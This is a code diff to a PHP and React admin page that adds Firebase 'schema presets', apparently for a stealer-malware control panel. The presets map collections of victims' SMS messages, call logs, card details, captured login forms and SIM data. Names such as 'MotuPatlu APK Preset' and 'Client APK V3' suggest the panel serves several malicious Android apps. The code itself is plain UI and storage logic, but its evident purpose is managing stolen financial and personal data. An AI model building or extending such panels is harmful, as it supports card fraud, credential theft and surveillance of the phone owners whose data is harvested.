@@ -95,11 +95,69 @@ include_once __DIR__ . '/header.php';
         }
       };
 
+      const DEFAULT_SCHEMA_PRESETS = {
+        v1_standard: { name: "⚡ Adminto Standard V1", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" },
+        rtdb_v2: { name: "🔥 RTDB Custom V2 (Your Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
+        motupatlu: { name: "📱 MotuPatlu APK Preset", sms: "sma", calls: "call_records", cards: "card_details", forms: "userInputs", sims: "sims" },
+        legacy: { name: "🛡️ Legacy Classic Preset", sms: "messages", calls: "call_logs", cards: "cards", forms: "finalData", sims: "sim_info" }
+      };
+
+      const [customPresets, setCustomPresets] = React.useState(() => {
+        try {
+          const saved = localStorage.getItem('adminto_custom_presets');
+          return saved ? JSON.parse(saved) : {};
+        } catch(e) { return {}; }
+      });
+
+      const allPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...customPresets }), [customPresets]);
+
+      const [editPresetKey, setEditPresetKey] = React.useState('custom');
       const [editSmsColl, setEditSmsColl] = React.useState('smsData');
       const [editCallsColl, setEditCallsColl] = React.useState('callData');
       const [editCardsColl, setEditCardsColl] = React.useState('cardData');
       const [editFormsColl, setEditFormsColl] = React.useState('formData');
       const [editSimsColl, setEditSimsColl] = React.useState('simData');
+
+      const handleApplyPreset = (presetKey) => {
+        setEditPresetKey(presetKey);
+        if (presetKey !== 'custom' && allPresets[presetKey]) {
+          const p = allPresets[presetKey];
+          setEditSmsColl(p.sms);
+          setEditCallsColl(p.calls);
+          setEditCardsColl(p.cards);
+          setEditFormsColl(p.forms);
+          setEditSimsColl(p.sims || 'simData');
+        }
+      };
+
+      const handleSaveNewPreset = () => {
+        const name = prompt('Enter a custom name for this schema preset (e.g. "Client APK V3"):');
+        if (!name || !name.trim()) return;
+        const key = `user_preset_${Date.now()}`;
+        const newPreset = {
+          name: `⭐ ${name.trim()}`,
+          sms: editSmsColl || 'smsData',
+          calls: editCallsColl || 'callData',
+          cards: editCardsColl || 'cardData',
+          forms: editFormsColl || 'formData',
+          sims: editSimsColl || 'simData',
+          isUserCreated: true
+        };
+        const updated = { ...customPresets, [key]: newPreset };
+        setCustomPresets(updated);
+        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
+        setEditPresetKey(key);
+        alert(`✓ Custom preset "${name.trim()}" saved successfully to your dropdown!`);
+      };
+
+      const handleDeleteCustomPreset = (key) => {
+        if (!confirm('Are you sure you want to delete this custom preset from your dropdown?')) return;
+        const updated = { ...customPresets };
+        delete updated[key];
+        setCustomPresets(updated);
+        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
+        setEditPresetKey('custom');
+      };
 
       const openFirebaseModal = (op) => {
         setEditingOp(op);
@@ -113,6 +171,7 @@ include_once __DIR__ . '/header.php';
         setEditCardsColl(op.collectionMap?.cards || 'cardData');
         setEditFormsColl(op.collectionMap?.forms || 'formData');
         setEditSimsColl(op.collectionMap?.sims || 'simData');
+        setEditPresetKey('custom');
         setRawJsonPaste('');
         setSaveStatus('');
       };
@@ -428,23 +487,50 @@ include_once __DIR__ . '/header.php';
                   </div>
                   {/* SuperAdmin Custom Collection Mapping */}
                   <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
-                    <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                      <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
+                      <span className="pulse-badge active" style={{ fontSize: '0.7rem' }}>One-Click Presets Active</span>
+                    </div>
+
+                    {/* Presets Selector Dropdown & Preset Manager */}
+                    <div style={{ background: 'rgba(17,24,39,0.8)', padding: '10px 12px', borderRadius: '10px', border: '1px dashed rgba(56,189,248,0.4)' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
+                        <label style={{ fontSize: '0.75rem', color: '#38bdf8', fontWeight: 600 }}>⚡ Select Database Schema Preset (Auto-Fill Mappings):</label>
+                        <button type="button" onClick={handleSaveNewPreset} style={{ background: 'rgba(56,189,248,0.15)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', borderRadius: '6px', padding: '2px 8px', fontSize: '0.72rem', fontWeight: 700, cursor: 'pointer' }}>
+                          ➕ Save as New Preset
+                        </button>
+                      </div>
+                      <div style={{ display: 'flex', gap: '6px' }}>
+                        <select className="filter-select" style={{ flex: 1, borderRadius: '8px' }} value={editPresetKey} onChange={(e) => handleApplyPreset(e.target.value)}>
+                          <option value="custom">🛠️ Custom Manual Setup</option>
+                          {Object.entries(allPresets).map(([key, p]) => (
+                            <option key={key} value={key}>{p.name}</option>
+                          ))}
+                        </select>
+                        {editPresetKey.startsWith('user_preset_') && (
+                          <button type="button" onClick={() => handleDeleteCustomPreset(editPresetKey)} style={{ background: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '8px', padding: '0 10px', fontSize: '0.75rem', cursor: 'pointer' }} title="Delete Custom Preset">
+                            🗑️
+                          </button>
+                        )}
+                      </div>
+                    </div>
+
                     <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                       <div>
                         <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
-                        <input type="text" className="search-input" value={editSmsColl} onChange={(e) => setEditSmsColl(e.target.value)} placeholder="smsData (or sma)" />
+                        <input type="text" className="search-input" value={editSmsColl} onChange={(e) => { setEditSmsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="smsData (or sma)" />
                       </div>
                       <div>
                         <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
-                        <input type="text" className="search-input" value={editCallsColl} onChange={(e) => setEditCallsColl(e.target.value)} placeholder="callData (or calls)" />
+                        <input type="text" className="search-input" value={editCallsColl} onChange={(e) => { setEditCallsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="callData (or calls)" />
                       </div>
                       <div>
                         <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
-                        <input type="text" className="search-input" value={editCardsColl} onChange={(e) => setEditCardsColl(e.target.value)} placeholder="cardData (or cards)" />
+                        <input type="text" className="search-input" value={editCardsColl} onChange={(e) => { setEditCardsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="cardData (or cards)" />
                       </div>
                       <div>
                         <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
-                        <input type="text" className="search-input" value={editFormsColl} onChange={(e) => setEditFormsColl(e.target.value)} placeholder="formData (or userInputs)" />
+                        <input type="text" className="search-input" value={editFormsColl} onChange={(e) => { setEditFormsColl(e.target.value); setEditPresetKey('custom'); }} placeholder="formData (or userInputs)" />
                       </div>
                     </div>
                   </div>
